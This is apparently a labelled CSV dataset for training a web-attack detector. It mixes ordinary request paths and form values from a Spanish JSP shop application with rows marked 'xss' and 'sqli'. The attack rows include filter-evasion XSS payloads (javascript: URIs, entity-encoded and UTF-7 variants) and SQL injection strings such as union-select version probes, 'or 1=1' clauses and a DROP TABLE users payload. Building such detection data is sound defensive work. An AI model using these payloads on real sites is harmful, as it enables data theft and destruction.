payload,type
5309,normal
miembros/index.jsp,normal
"o1UE1: select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1",sqli
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
miembros/imagenes/ogono.jpg,normal
ribera d'ondara,normal
<%<!--'%><script>alert(1);</script -->,xss
imagenes/cmenbul.gif,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/1.gif,normal
imagenes/3.gif,normal
imagenes/cmenbul.gif,normal
lesaca clar,normal
miembros/index.jsp,normal
coderch gordo,normal
publico/registro.jsp?modo=registro&login=mollerus&password=1capa2ad*or&nombre=Jorgelina&apellidos=Romanov+Xandri&email=bonyadi-pedro%40programa-gestion-erp.bv&dni=20914276P&direccion=Masia+Can+Giro%2C+5+&ciudad=Puente+del+Congosto&cp=33776&provincia=Lleida&ntc=0332806980099354&B1=Registrar,normal
publico/productos.jsp,normal
miembros/index.jsp,normal
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/3.gif,normal
miembros/salir.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal
ciudad real,normal
publico/autenticar.jsp?modo=entrar&login=utilla&pwd=33s4h9929r&remember=off&B1=Entrar,normal
miembros/fotos.jsp,normal
cotner,normal
15317,normal
3471,normal
<// style=x:expression\28javascript:alert(1)\29>,xss
"s)(s: select * from users where id=1 or "")(""=1 or 1=1 -- 1",sqli
miembros/imagenes/zarauz.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
"s,(s: select * from users where id=1 or "",("" or 1=1 -- 1",sqli
92251391r,normal
6660,normal
carmelo,normal
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
revelante,normal
elois,normal
publico/autenticar.jsp?modo=entrar&login=marge&pwd=g1ne136&remember=on&B1=Entrar,normal
global/estilos.css,normal
publico/autenticar.jsp?modo=entrar&login=marlowe&pwd=gavota&remember=on&B1=Entrar,normal
miembros/salir.jsp,normal
"so{s: select * from users where id=1 or ""%{"" or 1=1 -- 1",sqli
valdivieso,normal
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss
kouraviev@socimi.com.gl,normal
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",xss
imagenes/1.gif,normal
40355743n,normal
07485924e,normal
dziawa,normal
mcbrayne,normal
global/titulo.jsp,normal
imagenes/logo.gif,normal
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",xss
miembros/editar.jsp?modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,normal
miembros/salir.jsp,normal
6.61E+15,normal
"&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1",sqli
makazaga millares,normal
"c/ tamesis 39, 1?c",normal
conciliador,normal
index.jsp,normal
chicon merlo,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=15&B1=A%F1adir+al+carrito,normal
badajoz,normal
37130,normal
miembros/imagenes/castro.jpg,normal
rgiva,normal
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>,xss
imagenes/logo.gif,normal
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
miembros/editar.jsp?modo=registro&login=maurie&password=0StroP5je0&nombre=Vlentina&apellidos=Fisas&email=marlaud_losee5%40redesmilitantes.tf&dni=54430634F&direccion=Viseu+81+8%3FC&ciudad=Corbera+d%27Ebre&cp=48210&provincia=Murcia&ntc=4713791605534130&B1=Registrar,normal
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
"<! foo=""><script>alert(1)</script>"">",xss
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=kesling8&pwd=g8629e8d9r&remember=off&B1=Entrar,normal
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss
andrs castanyer,normal
calle gurugu 142 4?d,normal
publico/pagar.jsp?modo=insertar&precio=119&B1=Pasar+por+caja,normal
47172,normal
miembros/imagenes/castro.jpg,normal
global/creditos.jsp,normal
madgett,normal
publico/autenticar.jsp?modo=entrar&login=holdaway&pwd=TAbuRETe&remember=on&B1=Entrar,normal
ulrico,normal
publico/pagar.jsp?modo=insertar&precio=1998&B1=Confirmar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/2.gif,normal
publico/registro.jsp?modo=registro&login=gwenny&password=BOCana%24da&nombre=Danimiro&apellidos=Prosd%F3cimo+Surinyac&email=maren-bufford4%40fruteriacartaya.yu&dni=04212893Y&direccion=C%2F+Galicia%2C+180%2C+&ciudad=Robleda&cp=06440&provincia=C%F3rdoba&ntc=1856004857366548&B1=Registrar,normal
forfoleda,normal
imagenes/logo.gif,normal
miembros/index.jsp,normal
publico/productos.jsp,normal
global/creditos.jsp,normal
miembros/editar.jsp?modo=registro&login=mauro&password=PON38rA1L9&nombre=Mirko&apellidos=Valeri+Arlat&email=griffith_chesbro%40psykoterapeut.sn&dni=68133766S&direccion=Urbanitzacio+Canyet+24%2C+4%3FA&ciudad=Vall+de+Bianya%2C+La&cp=21208&provincia=Guadalajara&ntc=6202740443449579&B1=Registrar,normal
miembros/salir.jsp,normal
katia,normal
imagenes/nuestratierra.jpg,normal
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",xss
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
global/creditos.jsp,normal
imagenes/2.gif,normal
publico/miembros.jsp,normal
9362,normal
global/creditos.jsp,normal
miembros/imagenes/castro.jpg,normal
brines grimalda,normal
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",xss
bfilename,sqli
torreblacos,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/titulo.jsp,normal
"<xml src=""javascript:document.vulnerable=true;"">",xss
1437,normal
hlinka,normal
99eja36r9a,normal
imagenes/3.gif,normal
123);DROP%20TABLE%20users--,sqli
empeine,normal
publico/miembros.jsp,normal
imagenes/1.gif,normal
21292,normal
"<;IMG DYNSRC="";javascript:alert(';XSS';);"";>;",xss
di lorenzo,normal
monopolizador,normal
miembros/fotos.jsp,normal
prado de la guzpea,normal
publico/pagar.jsp?modo=insertar&precio=6534&B1=Confirmar,normal
miembros/imagenes/castro.jpg,normal
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
36823414t,normal
7150,normal
' and 1=0) union all,sqli
"so,s: select * from users where id=1 or ""%,"" or 1=1 -- 1",sqli
miembros/editar.jsp?modo=registro&login=zoratti&password=C9b4%2BtAL&nombre=Rabulas&apellidos=Documet+Recasens&email=gavin%40apagado.com.pk&dni=20048048Y&direccion=General+Lacy%2C+122+&ciudad=Roda+de+Andaluc%EDa%2C+La&cp=08611&provincia=Barcelona&ntc=2557912970687783&B1=Registrar,normal
28221877a,normal
"<BGSOUND SRC=""javascript:javascript:alert(1);"">",xss
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
imagenes/cmenbul.gif,normal
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
global/menum.jsp,normal
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;",xss
"c/ fuente del peral 41,",normal
"<;A HREF="";http://www.google.com./"";>;XSS<;/A>;",xss
index.jsp,normal
spencer,normal
imagenes/logo.gif,normal
4089,normal
"molinos, los",normal
global/titulo.jsp,normal
03344221k,normal
16340,normal
global/titulo.jsp,normal
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
imagenes/logo.gif,normal
"<LAYER SRC=""javascript:document.vulnerable=true;""></LAYER>",xss
baigent@blueberryminiloaf.com.dj,normal
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",xss
publico/miembros.jsp,normal
houstin@maxitienda.zr,normal
publico/registro.jsp?modo=registro&login=leshowit&password=eflujo&nombre=Solania&apellidos=Argim%F3n&email=benfield%40chuecafamily.gs&dni=67663365X&direccion=Plaza+Ignacio+Mercader+77+&ciudad=Coru%F1a%2C+A&cp=42218&provincia=Burgos&ntc=4650446572677289&B1=Registrar,normal
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,xss
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"UE11n: select * from users where id=1 union select 1 1a,version() -- 1",sqli
imagenes/3.gif,normal
"s{UEv: select * from users where id=1 or 1#""{ union select null,version() -- 1",sqli
"so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'",sqli
ferne,normal
miembros/imagenes/ogono.jpg,normal
"cami son anglada, s/n",normal
global/titulo.jsp,normal
miembros/index.jsp,normal
6.27E+15,normal
"c/ venus 91, 1e",normal
index.jsp,normal
miembros/index.jsp,normal
"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",xss
exec sp,sqli
segu san marful,normal
<img src=`xx:xx`onerror=alert(1)>,xss
"son: select * from users where id=1 or ""%["" or 1=1 -- 1",sqli
de_la,normal
93289880v,normal
3902,normal
gayol,normal
2.56E+15,normal
imagenes/logo.gif,normal
45681,normal
"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/nuestratierra.jpg,normal
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
x' and email is NULL; --,sqli
publico/caracteristicas.jsp?id=1,normal
3411,normal
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
publico/caracteristicas.jsp?id=2,normal
gelber serarols,normal
alkin@lesionesmusculares.pf,normal
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,xss
9869,normal
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=3027&B1=Confirmar,normal
"<;A HREF="";http://google.com/"";>;XSS<;/A>;",xss
"<;XML SRC="";http://ha.ckers.org/xsstest.xml""; ID=I>;<;/XML>;",xss
miembros/editar.jsp?modo=registro&login=derbyshi&password=filen%3Fa&nombre=Anuar&apellidos=Cruselles+Varela&email=jane%4023horas.ua&dni=95001516Q&direccion=Muelle+Evaristo+Churruca%2C+149+5%3FE&ciudad=Friera+de+Valverde&cp=50133&provincia=Salamanca&ntc=5389852449679105&B1=Registrar,normal
"<body BACKGROUND=""javascript:document.vulnerable=true;"">",xss
bettine,normal
